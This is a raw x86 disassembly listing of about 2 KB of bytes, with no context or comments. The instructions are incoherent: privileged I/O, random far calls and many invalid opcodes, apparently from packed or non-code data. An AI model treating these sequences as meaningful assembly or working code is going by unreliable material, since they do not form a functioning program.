  425001:	imul   eax,esp,0x235dd2fa
  425007:	pushf  
  425008:	or     al,0xac
  42500a:	bound  esi,QWORD PTR [edi]
  42500c:	xor    BYTE PTR [edx],ah
  42500e:	call   0x3d6be714
  425013:	add    ecx,DWORD PTR [esi-0x76]
  425016:	and    edi,0x9be94cf8
  42501c:	outs   dx,DWORD PTR ds:[esi]
  42501d:	hlt    
  42501e:	dec    esp
  42501f:	push   0x79
  425021:	in     eax,dx
  425022:	les    ecx,FWORD PTR [esi+0xb]
  425025:	push   edi
  425026:	scas   al,BYTE PTR es:[edi]
  425027:	test   eax,0xeb32e8e5
  42502c:	pop    ss
  42502d:	mov    edi,0x30513a46
  425032:	arpl   dx,bx
  425034:	out    0x4b,al
  425036:	jne    0x425057
  425038:	sub    al,0x51
  42503a:	es mov ch,0xfe
  42503d:	call   0xdea6:0xef4b0f9e
  425044:	adc    bh,BYTE PTR [ebx]
  425046:	jl     0x424fea
  425048:	nop
  425049:	sub    al,0xf0
  42504b:	add    esi,eax
  42504d:	loop   0x4250a1
  42504f:	ins    BYTE PTR es:[edi],dx
  425050:	push   ebp
  425051:	pop    edi
  425052:	or     al,0x85
  425054:	push   esi
  425055:	lds    ecx,FWORD PTR [ebp-0x35b425b7]
  42505b:	sbb    BYTE PTR [ebx+edi*8],cl
  42505e:	and    ah,cl
  425060:	pusha  
  425061:	sbb    esp,DWORD PTR [esi-0x76]
  425064:	ret    0xdf15
  425067:	fcomp  DWORD PTR [ecx-0x3a95c83a]
  42506d:	nop
  42506e:	inc    esi
  42506f:	(bad)  
  425071:	div    BYTE PTR [esp+eiz*8-0x2026dd5a]
  425078:	push   edx
  425079:	(bad)  
  42507a:	fcom   DWORD PTR [edx+0x13]
  42507d:	cmc    
  42507e:	xor    ecx,esp
  425080:	adc    DWORD PTR [edx],esp
  425082:	outs   dx,BYTE PTR ds:[esi]
  425083:	sbb    ch,BYTE PTR [ecx]
  425085:	retf   0x489
  425088:	xor    al,0x53
  42508a:	stos   BYTE PTR es:[edi],al
  42508b:	add    dl,dl
  42508d:	call   0xbe79524a
  425092:	jecxz  0x425111
  425094:	inc    edi
  425095:	mov    edx,DWORD PTR [edi]
  425097:	aam    0x35
  425099:	call   0x72eadb89
  42509e:	xchg   edx,eax
  42509f:	push   ebp
  4250a0:	icebp  
  4250a1:	repz sbb bl,BYTE PTR [ecx]
  4250a4:	mov    DWORD PTR [edx-0x7b],edi
  4250a7:	imul   edx,esi,0x412c2a7f
  4250ad:	add    al,al
  4250af:	push   ds
  4250b0:	retf   0xd2bc
  4250b3:	and    ah,dh
  4250b5:	or     bl,bh
  4250b7:	imul   ecx,DWORD PTR [edi-0x2ba9a388],0xffffffc8
  4250be:	xchg   ebp,eax
  4250bf:	mov    ah,0x67
  4250c1:	mov    WORD PTR [esi+0x1b5378f9],cs
  4250c7:	push   ebx
  4250c8:	xor    eax,0xaee66fba
  4250cd:	pop    ebx
  4250ce:	push   ecx
  4250cf:	scas   eax,DWORD PTR es:[edi]
  4250d0:	cmp    eax,0xde84b211
  4250d5:	div    DWORD PTR [edx+0x1c6a3c7c]
  4250db:	mov    DWORD PTR [ecx],edi
  4250dd:	test   al,0xb9
  4250df:	test   cl,dl
  4250e1:	add    eax,0x874cbb86
  4250e6:	cdq    
  4250e7:	sbb    ebx,DWORD PTR [edi]
  4250e9:	and    eax,0xafe370ed
  4250ee:	rcl    BYTE PTR [esi+ebx*1+0x2f04fc07],cl
  4250f5:	xor    cl,BYTE PTR [esi]
  4250f7:	jbe    0x425117
  4250f9:	jne    0x425119
  4250fb:	addr16 retf 
  4250fd:	cmp    edx,esi
  4250ff:	cmp    bl,ch
  425101:	pop    ds
  425102:	outs   dx,BYTE PTR cs:[esi]
  425104:	into   
  425105:	xchg   BYTE PTR [ebp+0x20cdb6a1],dl
  42510b:	aas    
  42510c:	pop    esi
  42510d:	mov    esp,0xe40a80f3
  425112:	add    eax,0x1360baa0
  425117:	lods   al,BYTE PTR ds:[esi]
  425118:	xchg   esi,eax
  425119:	into   
  42511a:	lods   eax,DWORD PTR ds:[esi]
  42511b:	cmc    
  42511c:	sub    eax,0xe9c85e3c
  425121:	int3   
  425122:	fs (bad) 
  425124:	xor    DWORD PTR [ebp+0x737efe78],eax
  42512a:	push   0x1632a43e
  42512f:	xchg   DWORD PTR [esi+0x3f1c0e47],ebp
  425135:	clc    
  425136:	ss dec ebp
  425138:	inc    esi
  425139:	push   0xffffff87
  42513b:	dec    ebp
  42513c:	xchg   edi,eax
  42513d:	or     DWORD PTR [edi+0x2ec6abd7],0xffffffde
  425144:	pop    es
  425145:	push   ss
  425146:	mov    BYTE PTR [ecx],ah
  425148:	push   edx
  425149:	sti    
  42514a:	jnp    0x425126
  42514c:	idiv   bl
  42514e:	add    eax,0x79ed9817
  425153:	lds    ebp,FWORD PTR [ebx+0x4a563b44]
  425159:	test   BYTE PTR [esi-0xe],0x35
  42515d:	(bad)  
  42515e:	clc    
  42515f:	mov    bl,BYTE PTR [edi+0x2a10d0a2]
  425165:	push   DWORD PTR [edx]
  425167:	mov    ss,esp
  425169:	pop    ss
  42516a:	out    dx,eax
  42516b:	jns    0x4251b2
  42516d:	clc    
  42516e:	push   esp
  42516f:	push   esp
  425170:	add    al,0x89
  425172:	fsub   QWORD PTR [ecx]
  425174:	into   
  425175:	mov    ebp,0xf1063351
  42517a:	cmp    BYTE PTR [esi+0x63b3dd0],ah
  425180:	mov    eax,0xd6d38733
  425185:	(bad)  
  425186:	leave  
  425187:	mov    ebx,0x8d6c7943
  42518c:	fdiv   QWORD PTR [edx]
  42518e:	mov    bl,0x22
  425190:	fs push ecx
  425192:	iret   
  425193:	and    bl,BYTE PTR [edx+0x1d33423e]
  425199:	jb     0x42520e
  42519b:	leave  
  42519c:	dec    esp
  42519d:	repz dec esi
  42519f:	mov    es,WORD PTR [ecx-0x665b3548]
  4251a5:	mov    al,ds:0x9b1ad56c
  4251aa:	pop    es
  4251ab:	idiv   BYTE PTR [ebp+0x1fac2008]
  4251b1:	push   cs
  4251b2:	cmp    BYTE PTR [edx+0x4474f1d],bl
  4251b8:	dec    esi
  4251b9:	gs repz xchg ecx,eax
  4251bc:	sbb    cl,BYTE PTR [esi-0x7ff59e74]
  4251c2:	cdq    
  4251c3:	(bad)  
  4251c4:	jmp    0x743b94d5
  4251c9:	pop    edi
  4251ca:	sbb    BYTE PTR [edi],dh
  4251cc:	xchg   DWORD PTR [ecx+ebp*1-0x3482cf16],ebx
  4251d3:	jle    0x425189
  4251d5:	je     0x42523b
  4251d7:	or     eax,0xbabee621
  4251dc:	xchg   edi,eax
  4251dd:	mov    eax,0xba3e8076
  4251e2:	push   ebx
  4251e3:	cmp    BYTE PTR [edi+0x35],ah
  4251e6:	aas    
  4251e7:	or     al,0xc2
  4251e9:	ficom  WORD PTR [edi]
  4251eb:	mov    ecx,0x3fdf819b
  4251f0:	dec    ecx
  4251f1:	sub    al,0x25
  4251f3:	xchg   ecx,eax
  4251f4:	sar    BYTE PTR [edi+0x44f5ee48],cl
  4251fa:	jns    0x4251f4
  4251fc:	fdiv   DWORD PTR [ebp-0x16c6619b]
  425202:	test   edx,eax
  425204:	pop    ecx
  425205:	xchg   edx,eax
  425206:	inc    esp
  425207:	mov    eax,ds:0x7fc3cba8
  42520c:	ins    DWORD PTR es:[edi],dx
  42520d:	jle    0x4251fb
  42520f:	and    eax,DWORD PTR [edi+0x44021f81]
  425215:	sub    cl,BYTE PTR [ebp+0x7ab62764]
  42521b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42521c:	sub    al,0x6c
  42521e:	fwait
  42521f:	mov    eax,0xc560852b
  425224:	pop    ds
  425225:	retf   0x3477
  425228:	push   0xb4e0fe8c
  42522d:	mov    al,ds:0xaa0e7f4b
  425232:	fidiv  WORD PTR [ecx+0x2ac8b86b]
  425238:	das    
  425239:	cmp    eax,0xc5077f82
  42523e:	sub    esp,DWORD PTR [ebx+eiz*8-0x43bbba9e]
  425245:	and    DWORD PTR [edx-0xdf45371],0xffffff86
  42524c:	push   ebx
  42524d:	retf   
  42524e:	adc    eax,0xcc87cf4e
  425253:	mov    dl,0x26
  425255:	str    WORD PTR [ecx+0x3c]
  425259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42525a:	cmp    eax,0x9b56b888
  42525f:	dec    ecx
  425260:	repnz xchg esi,eax
  425262:	pop    ecx
  425263:	sub    BYTE PTR [ecx-0x76443fb2],ah
  425269:	lods   al,BYTE PTR ds:[esi]
  42526a:	push   edx
  42526b:	and    cl,BYTE PTR [esi-0x5a]
  42526e:	push   ebp
  42526f:	xlat   BYTE PTR ds:[ebx]
  425270:	pop    ecx
  425271:	pop    esp
  425272:	push   esi
  425273:	jl     0x425205
  425275:	mov    dh,BYTE PTR [esi+eiz*1]
  425278:	mov    ds:0x70f54c02,al
  42527d:	repz pop esp
  42527f:	jo     0x425289
  425281:	mov    ah,0x3b
  425283:	jns    0x4252cf
  425285:	into   
  425286:	mov    ds:0x3c2ce256,eax
  42528b:	rcl    BYTE PTR [eax],cl
  42528d:	or     edx,edx
  42528f:	and    edx,edi
  425291:	in     eax,0x74
  425293:	xchg   ebp,eax
  425294:	stos   BYTE PTR es:[edi],al
  425295:	jmp    0x42529a
  425297:	mov    gs,WORD PTR [edx+0x356ef684]
  42529d:	or     bh,BYTE PTR [ebx-0x3e]
  4252a0:	aad    0x35
  4252a2:	jge    0x4252c4
  4252a4:	push   es
  4252a5:	lods   al,BYTE PTR ds:[esi]
  4252a6:	pop    eax
  4252a7:	xchg   esp,eax
  4252a8:	aam    0xeb
  4252aa:	das    
  4252ab:	jecxz  0x42532a
  4252ad:	mov    eax,DWORD PTR [esi]
  4252af:	(bad)  
  4252b0:	dec    esi
  4252b1:	cli    
  4252b2:	hlt    
  4252b3:	xchg   esp,eax
  4252b4:	mov    esi,0x2d0d124c
  4252b9:	lock dec ebx
  4252bb:	enter  0xde0f,0x40
  4252bf:	jmp    FWORD PTR [edi+0x22]
  4252c2:	push   0xfa0ac692
  4252c7:	mov    dh,0x1a
  4252c9:	imul   esp,DWORD PTR [eax+eax*1+0x0],0x0
	...
  4252e9:	add    BYTE PTR [ecx+0x55],bl
  4252ec:	push   esp
  4252ed:	push   edx
  4252ee:	pop    esp
  4252ef:	push   ebx
  4252f0:	pop    edi
  4252f1:	pop    edi
  4252f2:	xchg   ebx,eax
  4252f3:	stos   DWORD PTR es:[edi],eax
  4252f4:	mov    ebx,0x478f7b96
  4252f9:	ds push edi
  4252fb:	fild   WORD PTR [ecx]
  4252fd:	add    BYTE PTR [ecx+0x37000006],cl
  425303:	pop    ecx
  425304:	cmc    
  425305:	jb     0x4252ee
  425307:	fs cwde 
  425309:	add    BYTE PTR [eax+0x1d361f00],bh
  42530f:	pop    es
  425310:	lods   al,BYTE PTR ds:[esi]
  425311:	mov    DWORD PTR gs:[ebx-0x1ffe2dd8],ebx
  425318:	in     al,0xf6
  42531a:	pusha  
  42531b:	xchg   esp,eax
  42531c:	ror    BYTE PTR [edi],cl
  42531e:	aas    
  42531f:	ret    
  425320:	sub    al,0x3
  425322:	clc    
  425323:	xchg   ecx,eax
  425324:	xor    ah,BYTE PTR ds:0x8f0c0067
  42532a:	outs   dx,BYTE PTR ds:[esi]
  42532b:	in     al,dx
  42532c:	xchg   BYTE PTR [ebx-0x4e],bl
  42532f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425330:	call   0x2d72:0x9cc57a5e
  425337:	loop   0x42532b
  425339:	add    al,0xf7
  42533b:	or     BYTE PTR [esp+ebp*4-0xb],0x36
  425340:	gs xchg edi,eax
  425342:	(bad)  
  425343:	cmp    esi,DWORD PTR [ebp+0x7c93418d]
  425349:	sahf   
  42534a:	adc    BYTE PTR [edi-0x3a],ah
  42534d:	pop    ebx
  42534e:	dec    eax
  42534f:	(bad)  
  425351:	pushf  
  425352:	mov    cl,0xd6
  425354:	lods   al,BYTE PTR ds:[esi]
  425355:	je     0x425366
  425357:	mov    cs,edi
  425359:	pop    eax
  42535a:	mov    ds:0xf528f2de,al
  42535f:	sbb    ebx,DWORD PTR [bx]
  425362:	mov    al,ds:0x39e2a3d4
  425367:	cli    
  425368:	cdq    
  425369:	xlat   BYTE PTR ds:[ebx]
  42536a:	test   eax,0xf6ff2ce3
  42536f:	jl     0x42539f
  425371:	push   ebp
  425372:	call   0x779a9c47
  425377:	push   cs
  425378:	mov    dh,0x52
  42537a:	push   es
  42537b:	fs fs mov ecx,0x6802a09
  425382:	sbb    al,0xf1
  425384:	sub    al,0xa4
  425386:	and    eax,0xd81ec0aa
  42538b:	ins    BYTE PTR es:[edi],dx
  42538c:	sbb    edx,DWORD PTR gs:[edi]
  42538f:	mov    WORD PTR [eax+0x50],fs
  425392:	fistp  DWORD PTR [eax*1+0x7baf966f]
  425399:	clc    
  42539a:	dec    ebp
  42539b:	and    al,0x78
  42539d:	or     esi,ebp
  42539f:	ror    BYTE PTR [eax],0xfb
  4253a2:	outs   dx,DWORD PTR ds:[esi]
  4253a3:	and    eax,0xf2880911
  4253a8:	mov    ebp,DWORD PTR [edx+ecx*4+0x616a890]
  4253af:	ret    0x9816
  4253b2:	enter  0xc726,0x3e
  4253b6:	pop    edi
  4253b7:	xor    al,BYTE PTR [esi+0x75e8e9e]
  4253bd:	or     BYTE PTR [ebx],bh
  4253bf:	xor    al,0x4c
  4253c1:	mov    cl,0x66
  4253c3:	or     BYTE PTR [edx+0x5f],cl
  4253c6:	loopne 0x42540b
  4253c8:	cmc    
  4253c9:	mov    edi,0x4342cc4d
  4253ce:	mov    al,ds:0x1643343
  4253d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253d4:	and    BYTE PTR [esi+0x37],cl
  4253d7:	push   edx
  4253d8:	pop    ss
  4253d9:	sbb    al,0xc5
  4253db:	mov    edi,0xf1e7ae82
  4253e0:	adc    al,0x6
  4253e2:	and    al,0x2f
  4253e4:	pop    esi
  4253e5:	retf   
  4253e6:	xchg   esp,eax
  4253e7:	pop    ss
  4253e8:	dec    ecx
  4253e9:	loope  0x425411
  4253eb:	and    eax,0x95cc298a
  4253f0:	and    ebx,esi
  4253f2:	jg     0x42540b
  4253f4:	retf   
  4253f5:	cmp    DWORD PTR [eax-0x696def9e],edx
  4253fb:	cs xchg edi,eax
  4253fd:	fstp   QWORD PTR [esi]
  4253ff:	push   esi
  425400:	inc    ebx
  425401:	jecxz  0x4253b7
  425403:	dec    ecx
  425404:	test   eax,edx
  425406:	ror    BYTE PTR [edx+0x48],1
  425409:	sub    ch,BYTE PTR [ebp+0x762ace79]
  42540f:	xchg   edx,eax
  425410:	dec    edx
  425411:	pop    esi
  425412:	shr    BYTE PTR [ebx-0x4b],cl
  425415:	jle    0x42545c
  425417:	les    ecx,FWORD PTR [eax+0x336418ee]
  42541d:	cmp    al,BYTE PTR [ecx-0x6f1ad0eb]
  425423:	jmp    0x425490
  425425:	push   cs
  425426:	xor    al,0x1d
  425428:	mov    gs,WORD PTR [ecx]
  42542a:	lods   al,BYTE PTR ds:[esi]
  42542b:	ret    0x9887
  42542e:	xchg   edi,eax
  42542f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425430:	data16 add dh,BYTE PTR [edi]
  425433:	push   ss
  425434:	xlat   BYTE PTR ds:[ebx]
  425435:	push   edx
  425436:	add    eax,0xa2af5dc5
  42543b:	adc    esi,DWORD PTR [ecx+0x69869b2a]
  425441:	popa   
  425442:	cmp    esi,DWORD PTR [edi-0x78]
  425445:	ins    BYTE PTR es:[edi],dx
  425446:	fs jae 0x42542d
  425449:	cmp    ebx,ebp
  42544b:	mov    esi,0x87616639
  425450:	pop    esp
  425451:	xchg   edi,eax
  425452:	lahf   
  425453:	and    DWORD PTR [edi-0x647cf5e9],0xa3eac80d
  42545d:	adc    eax,0x46f859bf
  425462:	jmp    0x16961ba7
  425467:	or     DWORD PTR [eax],esi
  425469:	cli    
  42546a:	cwde   
  42546b:	nop
  42546c:	out    0xcd,eax
  42546e:	mov    ?,WORD PTR [eax+0x3ce5a2a5]
  425474:	mov    edx,0xc5c9c13
  425479:	in     eax,0xd2
  42547b:	inc    ebx
  42547d:	or     al,0x9e
  42547f:	add    esp,DWORD PTR [edi+0x5e7d5adc]
  425485:	std    
  425486:	retf   
  425487:	push   0x7354f539
  42548c:	daa    
  42548d:	mov    bl,0xc0
  42548f:	(bad)  
  425490:	clc    
  425491:	ins    BYTE PTR es:[edi],dx
  425492:	rol    DWORD PTR [ebp-0x7028e771],1
  425498:	push   esp
  425499:	call   0xa0f2:0xda1f1e63
  4254a0:	test   ebp,edi
  4254a2:	cdq    
  4254a3:	or     DWORD PTR [ecx+0x55f0d26c],ecx
  4254a9:	repz cli 
  4254ab:	jecxz  0x4254ad
  4254ad:	cdq    
  4254ae:	cmp    esi,DWORD PTR ds:[ecx-0x796b3750]
  4254b5:	cmp    DWORD PTR [edi],esi
  4254b7:	xchg   BYTE PTR [ebx-0x47650835],cl
  4254bd:	xor    DWORD PTR [ebx+0x1bc8801f],esi
  4254c3:	pushf  
  4254c4:	dec    esp
  4254c5:	mov    edi,0xc7ddf144
  4254ca:	out    dx,al
  4254cb:	sbb    bh,BYTE PTR [edi+esi*1-0x5e]
  4254cf:	ret    0x9826
  4254d2:	push   esp
  4254d3:	pop    esp
  4254d4:	push   ebx
  4254d5:	(bad)  [edx]
  4254d7:	adc    ebp,DWORD PTR [ecx]
  4254d9:	or     ebx,0x49cb62c5
  4254df:	add    al,0x66
  4254e1:	xchg   edx,esp
  4254e3:	scas   al,BYTE PTR es:[edi]
  4254e4:	mov    ds:0xfeb2a469,eax
  4254e9:	jns    0x425482
  4254eb:	mov    ebp,0x8b2a30bc
  4254f0:	icebp  
  4254f1:	imul   ebx
  4254f3:	sbb    eax,0xae594395
  4254f8:	sti    
  4254f9:	mov    al,0x2c
  4254fb:	scas   eax,DWORD PTR es:[edi]
  4254fc:	sub    BYTE PTR [ebx],dl
  4254fe:	retf   
  4254ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425500:	xor    esp,edi
  425502:	and    cl,ch
  425504:	daa    
  425505:	adc    DWORD PTR [ebx-0x52],esi
  425508:	fisub  WORD PTR [ebp-0x2d]
  42550b:	push   ds
  42550c:	xchg   BYTE PTR [edi],al
  42550e:	xchg   DWORD PTR [edx+0x34],esp
  425511:	pop    es
  425512:	adc    BYTE PTR [esi+0x626b7fcb],bh
  425518:	lea    edi,[eax]
  42551a:	xor    eax,DWORD PTR ds:0xb3206478
  425520:	jg     0x42556d
  425522:	test   eax,0xbff88b65
  425527:	and    al,0xa9
  425529:	into   
  42552a:	cld    
  42552b:	xchg   BYTE PTR [eax],cl
  42552d:	shr    DWORD PTR [eax],1
  42552f:	lahf   
  425530:	imul   ah
  425532:	xchg   ecx,eax
  425533:	repz js 0x4254f6
  425536:	ss cs call 0x758fa1f6
  42553d:	sbb    BYTE PTR [ecx-0xf59b169],0x74
  425544:	cli    
  425545:	inc    ebx
  425546:	or     eax,0xf22df588
  42554b:	lods   eax,DWORD PTR ds:[esi]
  42554c:	retf   
  42554d:	popf   
  42554e:	imul   DWORD PTR [ebx]
  425550:	xor    bh,dl
  425552:	inc    esp
  425553:	jg     0x425534
  425555:	scas   al,BYTE PTR es:[edi]
  425556:	cmp    al,0xf6
  425558:	mov    edi,0x34cfef8
  42555d:	inc    ecx
  42555e:	loope  0x4255a2
  425560:	nop
  425561:	test   ecx,0x8be0370a
  425567:	xor    al,0x7d
  425569:	inc    esi
  42556a:	mov    ebp,0xa9a94018
  42556f:	in     eax,dx
  425570:	cwde   
  425571:	aam    0x67
  425573:	shr    bl,cl
  425575:	cmc    
  425576:	inc    esp
  425577:	mov    WORD PTR [ebx],?
  425579:	dec    edx
  42557a:	mov    dl,0x90
  42557c:	jle    0x425582
  42557e:	scas   eax,DWORD PTR es:[edi]
  42557f:	repnz lds edi,FWORD PTR [esi]
  425582:	jge    0x4255d4
  425584:	xchg   edi,ecx
  425586:	push   0xab11b78b
  42558b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42558c:	retf   
  42558d:	cwde   
  42558e:	adc    eax,0x152240eb
  425593:	or     BYTE PTR [edi+ecx*8+0x28],0x32
  425598:	jmp    0x7b80:0xbb26338e
  42559f:	jmp    0x8462:0x61655f24
  4255a6:	jmp    DWORD PTR [edi]
  4255a8:	ins    DWORD PTR es:[edi],dx
  4255a9:	(bad)  
  4255ab:	mov    esp,0x591844da
  4255b0:	sub    cl,0x2
  4255b3:	scas   eax,DWORD PTR es:[edi]
  4255b4:	mov    dl,0x15
  4255b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255b7:	inc    ebx
  4255b8:	jg     0x425636
  4255ba:	clc    
  4255bb:	sub    DWORD PTR [edi-0x486495bf],eax
  4255c1:	in     al,0x65
  4255c3:	xor    eax,0xf551673c
  4255c8:	mov    ?,WORD PTR [edx]
  4255ca:	xor    al,0x47
  4255cc:	pop    eax
  4255cd:	pop    edi
  4255ce:	in     eax,0xbb
  4255d0:	(bad)  
  4255d1:	das    
  4255d2:	inc    esi
  4255d3:	inc    ebp
  4255d4:	dec    ebp
  4255d5:	sub    BYTE PTR [ecx-0x62],bl
  4255d8:	inc    ebp
  4255d9:	jb     0x4255d3
  4255db:	mov    eax,0x6ff6b724
  4255e0:	inc    ebx
  4255e1:	xor    eax,0xc2b51bcb
  4255e6:	stc    
  4255e7:	jl     0x42559c
  4255e9:	or     edi,eax
  4255eb:	int3   
  4255ec:	xor    eax,0x4b610718
  4255f1:	outs   dx,BYTE PTR ds:[esi]
  4255f2:	das    
  4255f3:	in     al,0xe1
  4255f5:	repnz rcl DWORD PTR [ebx-0x32],1
  4255f9:	fnstcw WORD PTR [eax]
  4255fb:	mov    eax,0xab53fc6c
  425600:	out    dx,al
  425601:	xor    al,0xe6
  425603:	sbb    esp,0x53
  425606:	mov    esi,0xfd3bb766
  42560b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42560c:	pop    ebp
  42560d:	sub    DWORD PTR [esi-0x455c7a69],0xffffffc0
  425614:	mov    ah,0xd0
  425616:	daa    
  425617:	xor    ch,dh
  425619:	adc    eax,DWORD PTR [eax+0x2da296c3]
  42561f:	mov    ah,0xb3
  425621:	sbb    al,0xf9
  425623:	fs pop esp
  425625:	fsubr  st(2),st
  425627:	bound  eax,QWORD PTR [edi-0x46]
  42562a:	mov    bh,0x28
  42562c:	(bad)  
  42562d:	(bad)  
  42562e:	jns    0x4255de
  425630:	into   
  425631:	into   
  425632:	jb     0x425634
  425634:	mul    DWORD PTR [ebx]
  425636:	mov    al,BYTE PTR [ecx+ebx*4+0x34]
  42563a:	and    ah,0x3d
  42563d:	test   ah,0x49
  425640:	bnd jb 0x4256a7
  425643:	gs mov esi,0xae51ef21
  425649:	cdq    
  42564a:	sub    DWORD PTR [eax-0x69],ebx
  42564d:	or     BYTE PTR [eax+0x48],ch
  425650:	scas   eax,DWORD PTR es:[edi]
  425651:	xor    eax,0xff73942b
  425656:	sub    BYTE PTR [edx],bh
  425658:	jo     0x4255f1
  42565a:	lock inc ebp
  42565c:	or     eax,0x6e1be33c
  425661:	xor    cl,BYTE PTR [ecx-0x6ce269fa]
  425667:	repz jle 0x425684
  42566a:	inc    eax
  42566b:	sahf   
  42566c:	mov    cl,0xe9
  42566f:	daa    
  425670:	scas   eax,DWORD PTR es:[edi]
  425671:	and    esp,DWORD PTR [eax-0x3f]
  425674:	mov    bl,0x1f
  425676:	scas   al,BYTE PTR es:[edi]
  425677:	ret    0x5c4e
  42567a:	sub    ch,al
  42567c:	push   es
  42567d:	arpl   WORD PTR [esi],cx
  42567f:	pushf  
  425680:	mov    bl,0xdf
  425682:	aad    0x7d
  425684:	rcl    ecx,cl
  425686:	xchg   edx,eax
  425687:	cmp    eax,0x27ce5b85
  42568c:	scas   eax,DWORD PTR es:[edi]
  42568d:	stos   BYTE PTR es:[edi],al
  42568e:	sbb    ch,BYTE PTR [esi+0x52fd16a]
  425694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425695:	inc    esp
  425696:	mov    ds:0xde63c06a,eax
  42569b:	pop    edi
  42569c:	stos   BYTE PTR es:[edi],al
  42569d:	inc    ebx
  42569e:	adc    ebp,DWORD PTR [eax-0x51]
  4256a1:	sbb    edx,edi
  4256a3:	xor    esi,DWORD PTR [ecx]
  4256a5:	cmp    edx,DWORD PTR [eax-0x35df3fe3]
  4256ab:	cmp    BYTE PTR [ebx*2+0x6a1758f9],ch
  4256b2:	push   eax
  4256b3:	cld    
  4256b4:	mov    ah,0x68
  4256b6:	mov    ebp,0xa85bb12c
  4256bb:	jmp    0xae346e0c
  4256c0:	xchg   edi,eax
  4256c1:	aaa    
  4256c2:	add    BYTE PTR [ebp+0x41],ah
  4256c5:	dec    edx
  4256c6:	jnp    0x4256ad
  4256c8:	or     al,0x4e
  4256ca:	push   cs
  4256cb:	sbb    esi,DWORD PTR [ebp+esi*4-0x69e797eb]
  4256d2:	sbb    ah,BYTE PTR [ecx]
  4256d4:	je     0x494c6dc2
  4256da:	mov    edi,0x52af93df
  4256df:	cmp    BYTE PTR [edx],ch
  4256e1:	jl     0x4256a8
  4256e3:	inc    ebp
  4256e4:	push   ecx
  4256e5:	retf   
  4256e6:	dec    ebx
  4256e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256e8:	pop    edi
  4256e9:	arpl   WORD PTR [edi-0x7d],dx
  4256ec:	jae    0x425715
  4256ee:	test   al,0xe
  4256f0:	mov    ah,BYTE PTR [ebp-0x30e85618]
  4256f6:	aaa    
  4256f7:	es xchg ebp,eax
  4256f9:	dec    ebx
  4256fa:	pop    ds
  4256fb:	adc    bh,BYTE PTR [edi-0x7e]
  4256fe:	loop   0x425694
  425700:	pop    eax
  425701:	mov    al,ds:0x4808f512
  425706:	xor    eax,0x6a2a2271
  42570b:	inc    edi
  42570c:	inc    eax
  42570d:	sbb    esp,eax
  42570f:	mov    DWORD PTR ds:0x565db994,0x9801f5e0
  425719:	inc    eax
  42571a:	adc    al,0x3b
  42571c:	mov    ds:0x164e271d,al
  425721:	pushf  
  425722:	arpl   WORD PTR [eax-0x40cedf37],dx
  425728:	pop    eax
  425729:	jo     0x425762
  42572b:	xchg   esi,eax
  42572c:	push   edx
  42572d:	out    0x65,al
  42572f:	retf   0x4fe1
  425732:	(bad)  
  425733:	jmp    0x4256bd
  425735:	mov    ebp,0xfbf9f6f1
  42573a:	lods   al,BYTE PTR gs:[esi]
  42573c:	call   0xc444:0xc93431d9
  425743:	xchg   ebp,eax
  425744:	jmp    0x3931:0x3c683085
  42574b:	repz fild WORD PTR [edx]
  42574e:	push   edx
  42574f:	mov    bl,0x0
  425751:	inc    eax
  425752:	pop    es
  425753:	les    eax,FWORD PTR [eax]
  425755:	in     al,0x69
  425757:	sbb    DWORD PTR ds:0x203ea4d4,ecx
  42575d:	lds    edx,FWORD PTR [ecx+0x45]
  425760:	mov    BYTE PTR ds:0x508a485f,0x59
  425767:	mov    bl,0x4d
  425769:	mov    ch,0xe0
  42576b:	and    BYTE PTR [eax+ebx*8-0x5b4af867],bl
  425772:	jo     0x425796
  425774:	xchg   esi,eax
  425775:	adc    ebp,eax
  425777:	ins    DWORD PTR es:[edi],dx
  425778:	in     al,dx
  425779:	ja     0x4257c9
  42577b:	cli    
  42577c:	and    bl,BYTE PTR [esi]
  42577e:	adc    cl,bl
  425780:	ins    DWORD PTR es:[edi],dx
  425781:	jo     0x42571e
  425783:	and    DWORD PTR [ecx+0x8529e47],esp
  425789:	test   eax,0x34ab5a38
  42578e:	push   edx
  42578f:	mov    dh,0x2c
  425791:	xchg   edi,eax
  425792:	test   DWORD PTR [esi-0x60],esp
  425795:	or     eax,0x90f0cda7
  42579a:	pop    esi
  42579b:	or     ebp,DWORD PTR [edi-0x5b]
  42579e:	test   DWORD PTR [edx+0x28],esi
  4257a1:	jecxz  0x425739
  4257a3:	mov    ebx,0x50f6ad35
  4257a8:	scas   al,BYTE PTR es:[edi]
  4257a9:	jne    0x4257f4
  4257ab:	cld    
  4257ac:	jg     0x42580b
  4257ae:	mov    esp,0x42a88d19
  4257b3:	imul   eax,DWORD PTR [edx],0x6a
  4257b6:	jmp    0x425745
  4257b8:	mov    edx,0xb7e033a0
  4257bd:	mov    ebp,0x6a744b4
  4257c2:	dec    edx
  4257c3:	and    cl,BYTE PTR [esi-0x36]
  4257c6:	mov    edx,0xb2820b20
  4257cb:	popf   
  4257cc:	pop    ecx
  4257cd:	or     DWORD PTR [edx-0x71],0x4a973339
  4257d4:	int3   
  4257d5:	xchg   ebx,eax
  4257d6:	stos   BYTE PTR es:[edi],al
  4257d7:	rcr    DWORD PTR [edx+0x37],cl
  4257da:	sahf   
  4257db:	dec    ebx
  4257dc:	and    bh,ch
  4257de:	ret    
  4257df:	stc    
  4257e0:	gs aaa 
  4257e2:	pop    ebp
  4257e3:	and    BYTE PTR [ebp+0xa],dh
  4257e6:	sbb    al,BYTE PTR [esi]
  4257e8:	cwde   
  4257e9:	cli    
  4257ea:	push   ebp
  4257eb:	outs   dx,BYTE PTR ds:[esi]
  4257ec:	cmp    DWORD PTR [esi+ebx*4+0x6f],eax
  4257f0:	pop    es
  4257f1:	sbb    al,0x32
  4257f3:	inc    edi
  4257f4:	retf   0x75db
  4257f7:	jb     0x425792
  4257f9:	mov    ecx,0x42d1fff5
  4257fe:	dec    edx
  4257ff:	ins    BYTE PTR es:[edi],dx
  425800:	sti    
  425801:	ret    0xee93
  425804:	mov    cl,0x6b
